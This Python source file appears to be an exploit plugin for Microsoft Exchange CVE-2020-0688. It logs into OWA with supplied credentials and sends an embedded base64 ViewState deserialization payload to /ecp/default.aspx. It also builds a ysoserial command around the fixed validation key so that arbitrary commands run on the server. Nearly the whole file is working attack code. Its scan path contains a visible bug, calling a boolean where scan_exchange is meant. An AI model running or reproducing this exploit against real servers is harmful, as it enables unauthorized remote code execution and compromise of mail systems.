import argparse
from copy import copy

from plugins.Exchange import PluginExchangeBase
from utils import output
from utils.consts import AllPluginTypes
import requests as req
import readline
import argparse
import re
import sys
import urllib3
from urllib.parse import urlparse
from urllib.parse import quote
from http.cookies import SimpleCookie

urllib3.disable_warnings()


class PluginExchangeCVE_2020_0688(PluginExchangeBase):
    display = "Exchange CVE-2020-0688"
    alias = "ex_cve_2020_0688"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", required=True,
                            help="target ip", dest="ip")
        parser.add_argument("-u", "--user", required=True,
                            help="login account. Format: domain\\user", dest="username")
        parser.add_argument("-p", "--password", required=True, help="Password", dest="password")
        parser.add_argument("-t", "--timeout", help="Timeout", default=30, type=int, dest="timeout")

        sgorup = parser.add_mutually_exclusive_group()
        sgorup.add_argument("--scan", help="scan target.", default=False, action=argparse.BooleanOptionalAction,
                            dest="scan")
        sgorup.add_argument("-c", "--command", help="execute command", dest="command")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        url = f"https://{args.ip}/owa"
        user = args.username
        pwd = args.password
        timeout = args.timeout
        scan_mode = args.scan

        if scan_mode:
            scan_mode(args.ip, url, user, pwd, timeout)
        else:
            execute_command(url,user, pwd, args.command, timeout)
        return result


def scan_exchange(ip, url, user, pwd, timeout):
    output.info("Start to exploit..")

    session = req.Session()
    login = owa_login(session, url, user, pwd, timeout)
    if not login:
        return False

    # from https://github.com/zcgonvh/CVE-2020-0688
    out_payload = "/wEymAkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC6BzxSZXNvdXJjZURpY3Rpb25hcnkgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiIHhtbG5zOnM9ImNsci1uYW1lc3BhY2U6U3lzdGVtO2Fzc2VtYmx5PW1zY29ybGliIiB4bWxuczp3PSJjbHItbmFtZXNwYWNlOlN5c3RlbS5XZWI7YXNzZW1ibHk9U3lzdGVtLldlYiI+PE9iamVjdERhdGFQcm92aWRlciB4OktleT0iYSIgT2JqZWN0SW5zdGFuY2U9Int4OlN0YXRpYyB3Okh0dHBDb250ZXh0LkN1cnJlbnR9IiBNZXRob2ROYW1lPSIiPjwvT2JqZWN0RGF0YVByb3ZpZGVyPjxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9ImIiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgYX0iIE1ldGhvZE5hbWU9ImdldF9SZXNwb25zZSI+PC9PYmplY3REYXRhUHJvdmlkZXI+PE9iamVjdERhdGFQcm92aWRlciB4OktleT0iYyIgT2JqZWN0SW5zdGFuY2U9IntTdGF0aWNSZXNvdXJjZSBifSIgTWV0aG9kTmFtZT0iZ2V0X0hlYWRlcnMiPjwvT2JqZWN0RGF0YVByb3ZpZGVyPjxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9ImQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgY30iIE1ldGhvZE5hbWU9IkFkZCI+PE9iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPjxzOlN0cmluZz5YLVpDRy1URVNUPC9zOlN0cmluZz48czpTdHJpbmc+Q1ZFLTIwMjAtMDY4ODwvczpTdHJpbmc+PC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJlIiBPYmplY3RJbnN0YW5jZT0ie1N0YXRpY1Jlc291cmNlIGJ9IiBNZXRob2ROYW1lPSJFbmQiPjwvT2JqZWN0RGF0YVByb3ZpZGVyPjwvUmVzb3VyY2VEaWN0aW9uYXJ5PguiWEsRz0bNLTCuxZ4yOnVoyZanTg=="
    final_exp = "{}/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE={}".format(url,
                                                                                          quote(out_payload))
    output.info("Trigger payload..")
    # proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    output.info("Reset cookie ASP.NET_SessionId to null")

    session.cookies.set("ASP.NET_SessionId", "", domain=ip, path="/")
    resp = session.get(final_exp, verify=False, timeout=timeout, allow_redirects=False)
    if "X-ZCG-TEST" in resp.headers:
        output.success("Pwn ! Target {}  was vulnerable !".format(url))
    else:
        output.error("No vulnerable found.")


def execute_command(url, user, pwd, command, timeout):
    session = req.Session()

    view, key, base_url = get_value(session, url, user, pwd, timeout)
    if key is None:
        return False
    output.info(
        """\nysoserial.exe -p ViewState -g TextFormattingRunProperties -c "{}" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="{}" --viewstateuserkey="{}" --isdebug –islegacy""".format(
            command, view, key))
    out_payload = input('\n[*] Please input ysoserial payload:')
    final_exp = "{}/ecp/default.aspx?__VIEWSTATEGENERATOR={}&__VIEWSTATE={}".format(
        base_url, view, quote(out_payload))

    output.info("Exp url: {}".format(final_exp))
    output.info("Trigger payload..")

    status = session.get(final_exp, verify=False, timeout=timeout)
    output.success(status.status_code)


def owa_login(session, url, user, pwd, timeout):
    login_url = url + '/owa/auth.owa'
    version = get_owa_version(login_url)
    if not version or int(version) < 15:
        output.error("Not supported Exchange version, exit...")
        return False

    output.info("Trying to login owa...")
    paramsPost = '''password={}&isUtf8=1&passwordText=&trusted=4&destination={}&flags=4&forcedownlevel=0&username={}'''.format(
        pwd, url, user)
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0",
               "Content-Type": "application/x-www-form-urlencoded"}
    cookies = {"PBack": "0", "PrivateComputer": "true"}
    output.debug("Login url: {}".format(url))
    try:
        resp = session.post(login_url, data=paramsPost,
                            headers=headers, cookies=cookies, verify=False, timeout=timeout)
        output.debug("Status code:   %i" % resp.status_code)
        if "reason=" in resp.text:
            output.error("Login Incorrect, please try again with a different account..")
            return False

    except Exception as e:
        output.error("login error , error: {}".format(e))
        return False

    return True


def buildnumber_to_version(BuildNumber):
    # Reference:https://docs.microsoft.com/en-us/Exchange/new-features/build-numbers-and-release-dates?redirectedfrom=MSDN&view=exchserver-2019
    strlist = BuildNumber.split('.')
    return strlist[0]


def get_owa_version(url):
    try:
        r = req.get(url, verify=False)
        nPos1 = r.text.index('href="')
        str1 = r.text[nPos1 + 9:nPos1 + 40]
        nPos2 = str1.index('/')
        nPos3 = str1.index('/themes/')
        str2 = str1[nPos2:nPos3]
        nPos4 = str2.rindex('/')
        BuildNumber = str2[nPos4 + 1:]
        output.success('Get build number:%s' % (BuildNumber))
        result = buildnumber_to_version(BuildNumber)
    except Exception as e:
        output.error('Error in get exchagne version, exit.. error is :%s' % e)
        return False

    return result


def get_value(session, url, user, pwd, timeout):
    print("[*] Tring to login owa...")
    tmp = urlparse(url)
    base_url = "{}://{}".format(tmp.scheme, tmp.netloc)
    # paramsPost = {"password": ""+pwd+"", "isUtf8": "1", "passwordText": "", "trusted": "4",
    # 			"destination": ""+url+"", "flags": "4", "forcedownlevel": "0", "username": ""+user+""}
    paramsPost = '''password={}&isUtf8=1&passwordText=&trusted=4&destination={}&flags=4&forcedownlevel=0&username={}'''.format(
        pwd, url, user)
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0",
               "Connection": "close", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
               "Content-Type": "application/x-www-form-urlencoded", "Cookie": "PrivateComputer=true; PBack=0"}
    cookies = {"PBack": "0", "PrivateComputer": "true"}
    login_url = base_url + '/owa/auth.owa'
    print("[+] Login url: {}".format(login_url))
    try:
        login = session.post(login_url, data=paramsPost,
                             headers=headers, verify=False, timeout=timeout)
        print("[*] Status code:   %i" % login.status_code)
        if "reason=" in login.text or "reason=" in login.url and "owaLoading" in login.text:
            print("[!] Login Incorrect, please try again with a different account..")
            sys.exit(1)
    # print(str(response.text))
    except Exception as e:
        print("[!] login error , error: {}".format(e))
        sys.exit(1)
    print("[+] Login successfully! ")
    try:
        print("[*] Tring to get __VIEWSTATEGENERATOR...")
        target_url = "{}/ecp/default.aspx".format(base_url)
        new_response = session.get(target_url, verify=False, timeout=timeout)
        view = re.compile(
            'id="__VIEWSTATEGENERATOR" value="(.+?)"').findall(str(new_response.text))[0]
        print("[+] Done! __VIEWSTATEGENERATOR:{}".format(view))
    except:
        view = "B97B4E27"
        print("[*] Can't get __VIEWSTATEGENERATOR, use default value: {}".format(view))
    try:
        print("[*] Tring to get ASP.NET_SessionId....")
        key = session.cookies['ASP.NET_SessionId']
        print("[+] Done!  ASP.NET_SessionId: {}".format(key))
    except Exception as e:
        key = None
        print("[!] Get ASP.NET_SessionId error, error: {} \n[*] Exit..".format(e))
        sys.exit(1)
    return view, key, base_url
